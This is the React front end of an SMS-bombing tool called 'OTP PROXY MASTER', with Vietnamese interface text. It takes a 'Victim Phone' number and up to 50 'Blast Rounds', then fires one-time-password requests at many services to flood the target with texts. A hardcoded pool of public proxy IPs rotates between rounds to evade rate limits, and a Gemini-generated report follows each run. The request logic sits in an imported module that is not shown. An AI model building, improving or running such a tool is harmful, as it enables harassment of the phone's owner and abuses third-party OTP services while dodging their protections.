
import React, { useState, useEffect, useRef, useCallback } from 'react';
import { 
  Zap, 
  Terminal, 
  Smartphone, 
  Activity, 
  RefreshCw, 
  CheckCircle2, 
  XCircle,
  Shield,
  ShieldCheck,
  ShieldAlert,
  Settings,
  Globe,
  Database,
  Layers,
  Trash2
} from 'lucide-react';
import { OTP_SERVICES, triggerOTP } from './services/otpServices';
import { generateSessionSummary } from './services/geminiReport';
import { ServiceDefinition, LogEntry, SpamStats, ProxyConfig, ProxyItem } from './types';

const INITIAL_PROXY_LIST = `216.205.52.38:80
185.238.228.218:80
185.238.228.169:80
170.114.45.150:80
8.35.211.21:80
216.205.52.112:80
141.101.113.130:80
108.162.193.241:80
170.114.45.165:80
45.67.215.178:80
141.101.113.143:80
45.67.215.20:80
170.114.45.255:80
102.177.176.98:80
108.162.193.147:80
8.35.211.166:80
216.10.246.131:80
8.213.134.213:8080
67.43.227.227:27089
67.43.228.253:2851
77.232.38.102:17853
139.162.200.213:80
72.10.160.94:6369
138.117.84.194:8080
67.43.236.20:30165
67.43.227.226:6663`;

const App: React.FC = () => {
  const [phoneNumber, setPhoneNumber] = useState('');
  const [cycles, setCycles] = useState(1);
  const [isSpamming, setIsSpamming] = useState(false);
  const [services, setServices] = useState<ServiceDefinition[]>(OTP_SERVICES);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [stats, setStats] = useState<SpamStats>({
    totalSent: 0,
    successCount: 0,
    failureCount: 0,
    currentCycle: 0,
    totalCycles: 0
  });
  
  const [proxy, setProxy] = useState<ProxyConfig>({
    rawList: INITIAL_PROXY_LIST,
    pool: [],
    enabled: true
  });
  const [showProxySettings, setShowProxySettings] = useState(false);
  const [geminiReport, setGeminiReport] = useState<string | null>(null);
  
  const logEndRef = useRef<HTMLDivElement>(null);
  const isSpammingRef = useRef(false);

  useEffect(() => {
    isSpammingRef.current = isSpamming;
  }, [isSpamming]);

  useEffect(() => {
    updateProxyPool(INITIAL_PROXY_LIST);
  }, []);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const updateProxyPool = (raw: string) => {
    const lines = raw.split('\n').filter(line => line.trim().length > 0);
    const newPool: ProxyItem[] = lines.map(line => {
      const parts = line.trim().split(':');
      return {
        host: parts[0] || '',
        port: parts[1] || '',
        user: parts[2] || undefined,
        pass: parts[3] || undefined
      };
    }).filter(p => p.host && p.port);
    
    setProxy(prev => ({ ...prev, rawList: raw, pool: newPool }));
  };

  const addLog = useCallback((service: string, message: string, type: LogEntry['type']) => {
    const newLog: LogEntry = {
      id: Math.random().toString(36).substring(7),
      timestamp: new Date().toLocaleTimeString(),
      service,
      message,
      type
    };
    setLogs(prev => [newLog, ...prev].slice(0, 100));
  }, []);

  const runSpam = async () => {
    if (!phoneNumber || phoneNumber.length < 9) {
      addLog('SYSTEM', "Số điện thoại không hợp lệ", 'error');
      return;
    }

    if (proxy.enabled && proxy.pool.length === 0) {
      addLog('SYSTEM', "Chưa có danh sách Proxy hoạt động", 'error');
      return;
    }

    setIsSpamming(true);
    setGeminiReport(null);
    setStats({ totalSent: 0, successCount: 0, failureCount: 0, currentCycle: 1, totalCycles: cycles });
    
    for (let c = 1; c <= cycles; c++) {
      if (!isSpammingRef.current) break; 
      
      setStats(prev => ({ ...prev, currentCycle: c }));
      addLog('SYSTEM', `Bắt đầu đợt ${c}/${cycles} - Sử dụng Pool ${proxy.pool.length} IPs`, 'info');

      for (const svc of services) {
        if (!isSpammingRef.current) break;
        setServices(prev => prev.map(s => s.id === svc.id ? { ...s, status: 'Pending' } : s));
        
        const result = await triggerOTP(svc.id, phoneNumber, proxy);
        
        if (result.success) {
          setStats(prev => ({ ...prev, totalSent: prev.totalSent + 1, successCount: prev.successCount + 1 }));
          setServices(prev => prev.map(s => s.id === svc.id ? { ...s, status: 'Success' } : s));
          addLog(svc.name, `[OK] ${result.response}`, 'success');
        } else {
          setStats(prev => ({ ...prev, totalSent: prev.totalSent + 1, failureCount: prev.failureCount + 1 }));
          setServices(prev => prev.map(s => s.id === svc.id ? { ...s, status: 'Error' } : s));
          addLog(svc.name, `[FAIL] ${result.response}`, 'error');
        }
        
        // Nghỉ ngắn để tránh bị rate limit cục bộ
        await new Promise(r => setTimeout(r, 2000));
      }

      if (c < cycles && isSpammingRef.current) {
        addLog('SYSTEM', "Chờ 10 giây để xoay vòng Proxy mới...", 'warning');
        await new Promise(r => setTimeout(r, 10000));
      }
    }

    setIsSpamming(false);
    addLog('SYSTEM', "Tiến trình hoàn tất.", 'info');
    try {
        const summary = await generateSessionSummary(logs);
        setGeminiReport(summary);
    } catch (e) {
        console.error("AI Report error", e);
    }
  };

  const stopSpam = () => {
    setIsSpamming(false);
    addLog('SYSTEM', "Đã gửi lệnh dừng khẩn cấp.", 'warning');
  };

  return (
    <div className="min-h-screen p-4 md:p-8 flex flex-col gap-6 max-w-7xl mx-auto selection:bg-emerald-500 selection:text-white">
      <header className="flex flex-col md:flex-row md:items-center justify-between gap-4 bg-slate-900/80 p-6 rounded-[2rem] border border-slate-800 shadow-2xl backdrop-blur-xl">
        <div className="flex items-center gap-4">
          <div className="p-4 bg-emerald-500/10 rounded-2xl border border-emerald-500/20 shadow-[0_0_30px_rgba(16,185,129,0.1)]">
            <Zap className="w-8 h-8 text-emerald-400 fill-emerald-400/20" />
          </div>
          <div>
            <h1 className="text-2xl font-black tracking-tighter text-white uppercase italic flex items-center gap-2">
              OTP <span className="text-emerald-400">PROXY</span> MASTER
            </h1>
            <div className="flex items-center gap-2">
              <span className="flex h-2 w-2 rounded-full bg-emerald-500 animate-pulse" />
              <p className="text-[10px] text-slate-500 font-bold tracking-[0.3em] uppercase">Session: {stats.currentCycle}/{stats.totalCycles}</p>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-4">
          <div className="hidden md:flex flex-col items-end mr-2">
             <span className="text-[10px] text-slate-500 font-black uppercase tracking-widest">Active Proxy Pool</span>
             <span className="text-xs font-mono font-bold text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded-md border border-emerald-500/20">
                {proxy.pool.length} NODES
             </span>
          </div>
          <button 
            onClick={() => setShowProxySettings(!showProxySettings)}
            className={`flex items-center gap-2 px-6 py-3 rounded-2xl border transition-all ${proxy.enabled ? 'bg-emerald-500/10 border-emerald-500/50 text-emerald-400' : 'bg-slate-950 border-slate-800 text-slate-500'}`}
          >
            <Settings className={`w-4 h-4 ${isSpamming ? 'animate-spin' : ''}`} />
            <span className="text-xs font-black uppercase tracking-widest">Settings</span>
          </button>
        </div>
      </header>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 flex-1">
        <div className="lg:col-span-4 space-y-6">
          {/* Main Controls */}
          <div className="bg-slate-900/40 border border-slate-800 p-8 rounded-[2.5rem] backdrop-blur-xl shadow-2xl relative overflow-hidden">
            <h2 className="text-xs font-black text-slate-500 mb-8 flex items-center gap-2 uppercase tracking-[0.3em]">
              <Database className="w-4 h-4 text-emerald-400" />
              Target Control
            </h2>
            
            <div className="space-y-6">
              <div>
                <label className="block text-[10px] font-black text-slate-500 uppercase mb-3 tracking-widest ml-1">Victim Phone</label>
                <div className="relative">
                  <Smartphone className="absolute left-5 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-600" />
                  <input 
                    type="tel" 
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                    placeholder="0xxxxxxxxx"
                    className="w-full bg-slate-950/80 border border-slate-800 rounded-2xl pl-14 pr-6 py-5 text-white mono focus:border-emerald-500/50 outline-none transition-all shadow-2xl text-xl font-bold placeholder:text-slate-800"
                  />
                </div>
              </div>

              <div>
                <div className="flex justify-between items-end mb-3 px-1">
                    <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Blast Rounds</label>
                    <span className="text-emerald-400 font-mono font-bold text-sm">{cycles}x</span>
                </div>
                <input 
                  type="range" min="1" max="50" value={cycles}
                  onChange={(e) => setCycles(parseInt(e.target.value))}
                  className="w-full h-2 bg-slate-800 rounded-full appearance-none accent-emerald-500 cursor-pointer mb-2"
                />
              </div>

              <div className="pt-4">
                {isSpamming ? (
                  <button onClick={stopSpam} className="w-full bg-red-500/10 border border-red-500/30 text-red-500 font-black py-5 rounded-2xl hover:bg-red-500/20 transition-all uppercase text-xs tracking-[0.3em] flex items-center justify-center gap-2">
                    <XCircle className="w-4 h-4" /> Stop Process
                  </button>
                ) : (
                  <button onClick={runSpam} className="w-full bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black py-5 rounded-2xl shadow-[0_10px_40px_rgba(16,185,129,0.3)] transition-all uppercase text-xs tracking-[0.3em] flex items-center justify-center gap-3">
                    <Zap className="w-4 h-4 fill-current" /> 
                    Start Payload
                  </button>
                )}
              </div>
            </div>
          </div>

          {/* Proxy Config Editor */}
          {showProxySettings && (
            <div className="bg-slate-900 border border-emerald-500/30 p-8 rounded-[2.5rem] shadow-2xl animate-in zoom-in duration-300">
              <div className="flex items-center justify-between mb-6">
                <h3 className="text-xs font-black text-emerald-400 uppercase flex items-center gap-2 tracking-[0.2em]">
                  <Globe className="w-4 h-4" />
                  Proxy Intelligence
                </h3>
                <div className="flex gap-2">
                   <button onClick={() => updateProxyPool('')} className="p-2 bg-red-500/10 text-red-500 rounded-lg border border-red-500/20 hover:bg-red-500/20 transition-all">
                      <Trash2 className="w-3 h-3" />
                   </button>
                   <label className="relative inline-flex items-center cursor-pointer">
                    <input type="checkbox" checked={proxy.enabled} onChange={(e) => setProxy({...proxy, enabled: e.target.checked})} className="sr-only peer" />
                    <div className="w-11 h-6 bg-slate-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-emerald-600"></div>
                  </label>
                </div>
              </div>
              
              <div className="space-y-4">
                <textarea 
                    value={proxy.rawList}
                    onChange={(e) => updateProxyPool(e.target.value)}
                    placeholder="Dán danh sách proxy tại đây (host:port)..."
                    className="w-full h-64 bg-slate-950 border border-slate-800 rounded-2xl p-4 text-[10px] mono text-emerald-100/60 focus:border-emerald-500/40 outline-none resize-none custom-scrollbar"
                />
                <div className="flex items-center justify-between p-4 bg-slate-950/50 rounded-xl border border-slate-800/50">
                    <span className="text-[10px] text-slate-500 font-bold uppercase tracking-widest">Valid Nodes</span>
                    <span className="text-emerald-400 font-mono font-bold text-lg">{proxy.pool.length}</span>
                </div>
              </div>
            </div>
          )}

          {/* Statistics Grid */}
          <div className="grid grid-cols-2 gap-4">
              <div className="bg-slate-900/40 border border-slate-800 p-6 rounded-3xl flex flex-col items-center group hover:border-emerald-500/30 transition-colors">
                <span className="text-[9px] text-slate-600 uppercase font-black mb-2 tracking-widest">Delivered</span>
                <span className="text-4xl font-black text-emerald-400 mono tabular-nums drop-shadow-[0_0_10px_rgba(16,185,129,0.3)]">{stats.successCount}</span>
              </div>
              <div className="bg-slate-900/40 border border-slate-800 p-6 rounded-3xl flex flex-col items-center group hover:border-red-500/30 transition-colors">
                <span className="text-[9px] text-slate-600 uppercase font-black mb-2 tracking-widest">Blocked</span>
                <span className="text-4xl font-black text-red-500 mono tabular-nums drop-shadow-[0_0_10px_rgba(239,68,68,0.3)]">{stats.failureCount}</span>
              </div>
          </div>
        </div>

        {/* Dashboard Services & Logs */}
        <div className="lg:col-span-8 flex flex-col gap-6">
          <div className="bg-slate-900/40 border border-slate-800 rounded-[2.5rem] p-8 flex-1 backdrop-blur-sm relative overflow-hidden group">
            <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-emerald-500/30 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-1000" />
            <h2 className="text-xs font-black text-slate-500 mb-8 flex items-center gap-2 uppercase tracking-[0.3em]">
              <Activity className="w-4 h-4 text-emerald-400" />
              Service Infrastructure
            </h2>
            <div className="grid grid-cols-2 sm:grid-cols-3 gap-6">
              {services.map(svc => (
                <div key={svc.id} className={`p-6 rounded-[2rem] border flex flex-col gap-5 transition-all duration-500 relative overflow-hidden ${svc.status === 'Idle' ? 'bg-slate-950/20 border-slate-800/50 opacity-40' : svc.status === 'Pending' ? 'border-emerald-500/50 bg-emerald-500/5 ring-4 ring-emerald-500/5 scale-105 z-10' : svc.status === 'Success' ? 'border-emerald-500 bg-emerald-500/10' : 'border-red-500/50 bg-red-500/10'}`}>
                  <div className="flex justify-between items-start">
                    <div className="flex flex-col">
                        <span className="text-[11px] font-black uppercase text-white tracking-widest truncate max-w-[100px]">{svc.name}</span>
                        <span className="text-[8px] text-slate-600 font-bold uppercase tracking-tighter">{svc.category}</span>
                    </div>
                    {svc.status === 'Pending' ? <RefreshCw className="w-4 h-4 animate-spin text-emerald-400" /> : svc.status === 'Success' ? <CheckCircle2 className="w-4 h-4 text-emerald-400" /> : svc.status === 'Error' ? <ShieldAlert className="w-4 h-4 text-red-500" /> : <Shield className="w-4 h-4 text-slate-800" />}
                  </div>
                  <div className="h-2 w-full bg-slate-950/50 rounded-full overflow-hidden border border-slate-800/30">
                    {svc.status === 'Pending' && <div className="h-full bg-emerald-500 animate-pulse w-full shadow-[0_0_10px_rgba(16,185,129,0.5)]" />}
                    {svc.status === 'Success' && <div className="h-full bg-emerald-500 w-full shadow-[0_0_15px_#10b981]" />}
                    {svc.status === 'Error' && <div className="h-full bg-red-500 w-full shadow-[0_0_15px_#ef4444]" />}
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Monitoring Terminal */}
          <div className="bg-slate-950 border border-slate-800 rounded-[2.5rem] h-[500px] overflow-hidden flex flex-col shadow-2xl relative">
            <div className="p-6 border-b border-slate-900 flex items-center justify-between bg-slate-900/40 backdrop-blur-md z-10">
              <div className="flex items-center gap-3">
                <Terminal className="w-4 h-4 text-emerald-400" />
                <span className="text-[10px] font-black text-slate-400 uppercase tracking-[0.4em]">Signal_Intercept_Live</span>
              </div>
              <div className="flex gap-2">
                <div className="w-2.5 h-2.5 rounded-full bg-slate-800" />
                <div className="w-2.5 h-2.5 rounded-full bg-slate-800" />
                <div className="w-2.5 h-2.5 rounded-full bg-emerald-500/40 animate-pulse" />
              </div>
            </div>
            
            <div className="flex-1 overflow-y-auto p-8 space-y-4 mono text-[11px] z-0 custom-scrollbar scroll-smooth">
              {logs.length === 0 && (
                <div className="h-full flex flex-col items-center justify-center text-slate-800 opacity-20 pointer-events-none">
                    <Activity className="w-16 h-16 mb-4 animate-pulse" />
                    <span className="font-black text-sm tracking-[0.5em] uppercase">Monitor Standby</span>
                </div>
              )}
              {logs.map(log => (
                <div key={log.id} className="flex gap-5 group animate-in slide-in-from-left-4 duration-500">
                  <span className="text-slate-700 shrink-0 font-bold opacity-40">[{log.timestamp}]</span>
                  <span className={`font-black shrink-0 px-3 py-1 rounded-xl text-[9px] tracking-[0.2em] border ${log.type === 'success' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' : log.type === 'error' ? 'bg-red-500/10 text-red-400 border-red-500/20' : 'bg-blue-500/10 text-blue-400 border-blue-500/20'}`}>
                    {log.service.toUpperCase()}
                  </span>
                  <span className={`transition-colors font-medium ${log.type === 'error' ? 'text-red-400/80' : 'text-slate-400 group-hover:text-slate-100'}`}>{log.message}</span>
                </div>
              ))}
              <div ref={logEndRef} />
            </div>

            {/* AI Summary Overlay */}
            {geminiReport && (
                <div className="absolute bottom-8 left-8 right-8 p-8 bg-slate-900/95 border border-emerald-500/30 rounded-3xl shadow-[0_20px_60px_rgba(0,0,0,0.5)] backdrop-blur-xl animate-in slide-in-from-bottom-8 duration-700 z-20">
                    <div className="flex items-center gap-3 mb-4 border-b border-emerald-500/10 pb-3">
                        <ShieldCheck className="w-4 h-4 text-emerald-400" />
                        <h3 className="text-[10px] font-black text-emerald-400 uppercase tracking-[0.3em] italic">AI Security Intelligence</h3>
                    </div>
                    <p className="text-[13px] text-emerald-500/90 leading-relaxed font-bold italic tracking-tight">{geminiReport}</p>
                </div>
            )}
          </div>
        </div>
      </div>
      
      <style>{`
        .custom-scrollbar::-webkit-scrollbar { width: 5px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 10px; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #334155; }
        @keyframes progress {
          0% { transform: translateX(-100%); }
          100% { transform: translateX(100%); }
        }
        .animate-progress {
          animation: progress 2s infinite linear;
        }
      `}</style>
    </div>
  );
};

export default App;
